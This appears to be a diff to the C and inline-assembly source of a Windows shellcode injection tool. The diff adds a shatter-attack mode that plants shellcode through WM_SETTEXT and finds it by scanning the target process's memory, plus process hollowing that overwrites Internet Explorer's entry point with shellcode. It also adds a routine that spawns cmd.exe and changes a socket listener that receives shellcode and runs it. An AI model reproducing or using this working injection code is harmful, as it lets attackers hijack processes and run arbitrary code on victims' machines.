@@ -36,6 +36,9 @@
 // disable warning "ebp modified by inline asm"
 #pragma warning(disable : 4731)
 
+// space allocated on the stack for the shellcode
+#define STACK_SPACE 0x300
+
 char remote_cleanup[1024];
 u32 remote_cleanup_len = 0;
 
@@ -44,6 +47,8 @@ u32 copy_to_stack_len = 0;
 
 char shellcode[1024];
 u32 shellcode_len = 0;
+
+int shatter_inject = 0;
 
 FARPROC shellcode_peptr;
 
@@ -61,9 +66,8 @@ int target_is_k32 = 0;
 char scan_opcodes[] =	"\xc3"				// ret
 						"\xff\xd7\xc3"		// call edi ; ret
 						"\xff\xd7\xc9\xc3"	// call edi ; leave ; ret
-						"\xff\xd0\xc3"		// call eax ; ret
+						"\xeb\x09Hail Xenu" // call our lord
 						"\xe8\x44\x58\x99\x12\xc3" // call bla; ret
-						"\xff\xd0\xff\xe6"	// call eax ; jmp esi
 						"\xff\xd7\xff\xe6";	// call edi ; jmp esi
 
 void setupscanbase(DWORD id)
@@ -72,7 +76,6 @@ void setupscanbase(DWORD id)
 	char **mptr;
 
 	CheckMenuRadioItem(GetMenu(hDlg), ID_SC_RETPE, ID_SC_RETMEMR, id, MF_BYCOMMAND);
-
 	target_is_k32 = 0;
 
 	switch (id) {
@@ -196,7 +199,7 @@ void init_copy_to_stack(void)
 
 	_asm {
 sc_start:
-		mov ecx, 0x200
+		mov ecx, STACK_SPACE
 		sub esp, ecx
 		mov edi, esp
 
@@ -209,7 +212,7 @@ call_back:
 
 		call esp
 
-		add esp, 0x200
+		add esp, STACK_SPACE
 		ret
 
 jmp_fwd:
@@ -218,6 +221,37 @@ sc_end:
 	}
 }
 
+#define PAGE_SIZE 4096
+unsigned long scanremotemem(u8* target, unsigned target_len)
+{
+	static unsigned char page[PAGE_SIZE];
+	unsigned long base;
+	unsigned long offset = 0, start;
+
+	for (base = 0 ; base < 0xc0000000 ; base += PAGE_SIZE) {
+		if (!ReadProcessMemory(hRemoteProc, (void*)base, page, PAGE_SIZE, NULL)) {
+			offset = 0;
+			continue;
+		}
+
+		if (offset)
+			// start of shellcode found on preceding page, up to offset bytes
+			// XXX does not backtrack (searched: 'abcabx', found: 'abcab|cabx')
+			if (!memcmp(target + offset, page, target_len - offset))
+				return base - offset;
+
+		offset = 0;
+
+		for (start = 0 ; start < PAGE_SIZE-target_len ; start++)
+			if (!memcmp(target, page+start, target_len))
+				return base + start;
+
+		for (start = PAGE_SIZE - target_len + 1 ; start < PAGE_SIZE ; start++)
+			if (!memcmp(target, page+start, PAGE_SIZE - start))
+				offset = PAGE_SIZE - start;
+	}
+	return 0;
+}
 
 void runshellcode(void)
 {
@@ -227,8 +261,7 @@ void runshellcode(void)
 	stackrun  = IsDlgButtonChecked(hDlg, IDC_CHK_STKRUN) == BST_CHECKED;
 
 	if (remoterun) {
-		u8 *rptr, *rptr_cur;
-		DWORD rptr_len;
+		u8 *rptr;
 		HANDLE hRThread;
 
 		if (sc_fixup) {
@@ -240,35 +273,62 @@ void runshellcode(void)
 			sc_fixup = 0;
 		}
 
-		if (stackrun && shellcode_len > 0x200) {
+		if (stackrun && shellcode_len > STACK_SPACE) {
 			addbacklog("shellcode too big for stack!");
 			return;
 		}
 
-		rptr_len = remote_cleanup_len + (stackrun ? copy_to_stack_len + 0x200 : shellcode_len);
-		rptr = rptr_cur = (u8*)VirtualAllocEx(hRemoteProc, 0, rptr_len,
-			MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		if (shatter_inject) {
+			unsigned char sc[512];
+			unsigned sc_len;
+
+			if (stackrun) {
+				memcpy(sc, copy_to_stack, copy_to_stack_len);
+				memcpy(sc+copy_to_stack_len, shellcode, shellcode_len);
+				sc_len = copy_to_stack_len + STACK_SPACE;
+			} else {
+				memcpy(sc, shellcode, shellcode_len);
+				sc_len = shellcode_len;
+			}
+
+			// XXX need zero-free ?
+			SendMessage(targethwnd, WM_SETTEXT, sc_len, (LPARAM)sc);
+
+			rptr = (u8*)scanremotemem(sc, sc_len);
+			if (!rptr) {
+				addbacklog("cannot find shellcode in remote address space");
+				return;
+			}
+		} else {
+			DWORD rptr_len;
+			u8 *rptr_cur;
+
+			rptr_len = remote_cleanup_len + (stackrun ? copy_to_stack_len + STACK_SPACE : shellcode_len);
+
+			rptr = rptr_cur = (u8*)VirtualAllocEx(hRemoteProc, 0, rptr_len,
+				MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		
-		if (!rptr) {
-			showlasterror("virtualallocex");
-			return;
-		}
+			if (!rptr) {
+				showlasterror("virtualallocex");
+				return;
+			}
 
-		if (!WriteProcessMemory(hRemoteProc, rptr_cur, remote_cleanup, remote_cleanup_len, 0))
-			goto err_free_write;
-		rptr_cur += remote_cleanup_len;
-
-		if (stackrun) {
-			if (!WriteProcessMemory(hRemoteProc, rptr_cur, copy_to_stack, copy_to_stack_len, 0))
+			if (!WriteProcessMemory(hRemoteProc, rptr_cur, remote_cleanup, remote_cleanup_len, 0))
 				goto err_free_write;
-			rptr_cur += copy_to_stack_len;
+			rptr_cur += remote_cleanup_len;
+
+			if (stackrun) {
+				if (!WriteProcessMemory(hRemoteProc, rptr_cur, copy_to_stack, copy_to_stack_len, 0))
+					goto err_free_write;
+				rptr_cur += copy_to_stack_len;
+			}
+
+			if (!WriteProcessMemory(hRemoteProc, rptr_cur, shellcode, shellcode_len, 0))
+				goto err_free_write;
+
+			if (!VirtualProtectEx(hRemoteProc, rptr, rptr_len, PAGE_EXECUTE_READ, &rptr_len))
+				showlasterror("virtualprotect readonly");
 		}
-
-		if (!WriteProcessMemory(hRemoteProc, rptr_cur, shellcode, shellcode_len, 0))
-			goto err_free_write;
-
-		if (!VirtualProtectEx(hRemoteProc, rptr, rptr_len, PAGE_EXECUTE_READ, &rptr_len))
-			showlasterror("virtualprotect readonly");
 
 		if (!(hRThread = CreateRemoteThread(hRemoteProc, 0, 0, (LPTHREAD_START_ROUTINE)rptr, rptr, 0, 0))) {
 			showlasterror("createremotethread");
@@ -300,7 +360,7 @@ err_free:
 			_asm {
 				pushad
 				mov ebp, esp
-				mov ecx, 0x200
+				mov ecx, STACK_SPACE
 				sub esp, ecx
 				mov edi, esp
 				lea esi, shellcode
@@ -317,6 +377,67 @@ err_free:
 	}
 }
 
+// XXX get the filename from dialog textbox ?
+static char iexplore_path[] = "C:\\Program Files\\Internet Explorer\\IExplore.exe";
+void create_replace(void)
+{
+	STARTUPINFO si = {0};
+	PROCESS_INFORMATION pi = {0};
+	HANDLE hFile, hFileMap;
+	u8* f_ptr;
+	struct exe_header f;
+	int success = 0;
+
+	si.cb = sizeof(si);
+	if (!CreateProcess(iexplore_path, 0,
+		0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
+		showlasterror("createprocess iexplore");
+		return;
+	}
+
+	hFile = CreateFile(iexplore_path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		showlasterror("open iexplore file");
+		goto err1;
+	}
+	hFileMap = CreateFileMapping(hFile, 0, PAGE_READONLY, 0, 0, 0);
+	if (hFileMap == INVALID_HANDLE_VALUE) {
+		showlasterror("mmap iexplore");
+		goto err2;
+	}
+	f_ptr = (u8*)MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
+	if (!f_ptr) {
+		showlasterror("mapview iexplore");
+		goto err3;
+	}
+	if (!loadpe(&f, f_ptr, 1)) {
+		addbacklog("iexplore: invalid pe ?");
+		goto err4;
+	}
+
+	if (!WriteProcessMemory(pi.hProcess,
+			(LPVOID)(f.ohdr->image_base + f.ohdr->address_of_entry_point),
+			shellcode, shellcode_len, 0))
+		showlasterror("rewrite iexplore");
+	else {
+		addbacklog("createreplace successful");
+		success = 1;
+	}
+
+err4:
+	UnmapViewOfFile(f_ptr);
+err3:
+	CloseHandle(hFileMap);
+err2:
+	CloseHandle(hFile);
+err1:
+	if (success)
+		ResumeThread(pi.hThread);
+	else
+		TerminateProcess(pi.hProcess, 0);
+	CloseHandle(pi.hThread);
+	CloseHandle(pi.hProcess);
+}
 
 void calc_sc_hash(void)
 {
@@ -382,7 +503,7 @@ void init_bindlistenexecute(void)
 		call find_proc
 		call eax
 
-		push eax			// our socket
+		push eax			// socket
 
 		mov ebx, eax		// check -1
 		inc ebx
@@ -404,7 +525,7 @@ void init_bindlistenexecute(void)
 		test eax, eax
 		jnz out_close
 
-		pop eax				// our socket
+		pop eax				// socket
 		push eax
 
 		push 1				// backlog
@@ -417,7 +538,7 @@ void init_bindlistenexecute(void)
 		jnz out_close
 
 acceptagain:
-		pop eax				// our socket
+		pop eax				// listening socket
 		push eax
 
 		push 0
@@ -436,7 +557,7 @@ acceptagain:
 
 		push 0
 		push 4
-		lea ebx, [ebp-0x104]	// buffer (will receive length of shellcode)
+		lea ebx, [ebp-0x104]	// reuse ws2_init buffer (will receive length of shellcode)
 		push ebx
 		push eax
 		mov edi, H_recv
@@ -456,10 +577,10 @@ acceptagain:
 		mov ebp, esp
 		sub esp, ecx
 
-		push ebp
-		mov ebp, esp
+		mov ebx, esp
 
-		lea ebx, [ebp+4]
+		// {{{
+		push ebx			// sc buffer
 		push ecx			// sc length
 
 		push 0
@@ -470,18 +591,20 @@ acceptagain:
 		call find_proc
 		call eax
 
-		pop ecx				// check length
-		cmp eax, ecx
-		pop eax
+		pop ecx				// pop length
+		cmp eax, ecx		// check requested vs got
+		pop eax				// pop buffer
+		// }}}
+
 		jnz leavecloseandagain
 
+		push ebp
 		mov ebp, esp
-		call eax			// run shellcode
-							// it must preserve ebp and not trash the stack above esp and return
+		call eax			// run shellcode which must preserve ebp, not trash the stack above esp, and return
 		mov esp, ebp
+		pop ebp
 
 leavecloseandagain:
-		leave
 		leave
 
 closeandagain:
@@ -1147,7 +1270,6 @@ searchagain:
 		mov al, 0xe6
 		scasb
 		jnz searchagain
-
 		pop eax
 		inc eax
 
@@ -1564,6 +1686,77 @@ sc_end:
 	}
 }
 
+void init_shellcode_misc(void)
+{
+	INITSHELLCODE;
+	_asm sc_start:
+	FINDK32();
+	_asm {
+		mov edi, H_GetStartupInfoA
+		call find_proc
+
+		// sz startupinfo
+		sub esp, 0x100
+		mov ebp, esp
+		push esp
+		call eax
+		
+		mov edi, H_CreateProcessA
+		call find_proc
+
+		call blabite
+		x'c' x'm' x'd' x 0 x 0 x 0 x 0 x 0  x 0 x 0 x 0 x 0 x 0 x 0 x 0 x 0
+		x 0  x 0  x 0  x 0 x 0 x 0 x 0 x 0  x 0 x 0 x 0 x 0 x 0 x 0 x 0 x 0
+		x 0  x 0  x 0  x 0 x 0 x 0 x 0 x 0  x 0 x 0 x 0 x 0 x 0 x 0 x 0 x 0
+blabite:
+		pop ecx
+		xor ebx, ebx
+
+		// sz process_information
+		sub	esp, 0x20
+		push	esp
+		push	ebp
+		push	ebx
+		push	ebx
+		push	ebx
+		inc ebx
+		push	ebx	; Hérite les handles
+		dec ebx
+		push	ebx
+		push	ebx
+		push	ecx
+		push	ebx
+		call	eax
+
+		; Récupère l'adresse de Sleep
+		mov edi, H_Sleep
+		call find_proc
+		push	10000000
+		call	eax
+
+		mov edi, H_ExitProcess
+		call find_proc
+		push ebx
+		call eax
+find_proc:
+	}
+	FINDPROC();
+	_asm sc_end:
+}
+
+bool enable_callback(HWND h, LPARAM val)
+{
+	SendMessage(h, WM_ENABLE, val, 0);
+	return TRUE;
+}
+
+void do_misc(void)
+{
+	EnumChildWindows(targethwnd, (WNDENUMPROC)enable_callback, TRUE);
+//	init_shellcode_misc();
+//	runshellcode();
+}
+
 void init_testNX(void)
 {
 	INITSHELLCODE;
@@ -1820,7 +2013,6 @@ void backtrace(void)
 	}
 }
 
-
 int shellcode_handles(u32 id)
 {
 	switch (id) {
@@ -1828,6 +2020,11 @@ int shellcode_handles(u32 id)
 	case ID_EXITPROCESS:
 		init_exitprocess();
 		runshellcode();
+		return TRUE;
+
+	case ID_SHELLCODES_CREATEREPLACE:
+		init_getcommandline();
+		create_replace();
 		return TRUE;
 	
 	case ID_GETCMDLINE:
@@ -1853,6 +2050,10 @@ int shellcode_handles(u32 id)
 	case ID_SC_PATCH:
 		init_patch();
 		runshellcode();
+		return TRUE;
+
+	case ID_SC_MISC:
+		do_misc();
 		return TRUE;
 
 	// shellcode, can run in a remote process, tries to create a file "testfile"
@@ -1923,7 +2124,7 @@ int shellcode_handles(u32 id)
 		/* return on heap is only possible on local stack */
 		CheckDlgButton(hDlg, IDC_CHK_RMTRUN, BST_UNCHECKED);
 		//CheckDlgButton(hDlg, IDC_CHK_STKRUN, BST_CHECKED);
-  
+
 	case ID_SC_RETK32:
 		if (IsDlgButtonChecked(hDlg, IDC_CHK_RMTRUN) == BST_UNCHECKED)
 			CheckDlgButton(hDlg, IDC_CHK_STKRUN, BST_CHECKED);
@@ -1965,6 +2166,11 @@ int shellcode_handles(u32 id)
 	// helper, calculates the hash of an api name, which can then be used in shellcode writing
 	case ID_DEBUG_HASHPROCNAME:
 		calc_sc_hash();
+		return TRUE;
+
+	case ID_SHATTER_INJECT:
+		shatter_inject = !shatter_inject;
+		CheckMenuItem(GetMenu(hDlg), ID_SHATTER_INJECT, shatter_inject ? MF_CHECKED : MF_UNCHECKED);
 		return TRUE;
 	}
 	return FALSE;
